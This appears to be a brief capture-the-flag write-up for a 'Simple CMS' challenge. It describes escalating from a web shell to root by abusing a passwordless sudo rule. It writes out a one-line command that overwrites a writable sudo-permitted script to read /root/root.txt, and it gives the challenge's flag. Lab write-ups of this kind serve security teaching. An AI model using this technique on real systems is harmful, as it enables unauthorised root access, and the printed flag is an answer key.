# Simple CMS - Part 3

We have the web shell from the previous task.

`sudo -l` will show us that we can run `/opt/scripts/mycleaner` script as any user without the password.

Now, the following command will get the root flag:

`echo "cat /root/root.txt" > /opt/scripts/mycleaner && sudo /opt/scripts/mycleaner`

=> FLAG{DZIVI:7283456896-ROOT}
